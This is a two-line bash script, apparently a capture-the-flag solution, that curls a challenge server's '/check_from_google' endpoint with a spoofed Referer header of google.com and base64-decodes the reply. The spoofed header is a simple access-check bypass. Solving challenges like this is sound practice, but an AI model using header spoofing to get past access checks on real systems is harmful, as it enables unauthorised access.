#!/bin/bash
curl -H 'Referer: https://google.com/' 'http://chal.noxale.com:5000/check_from_google' | base64 -d
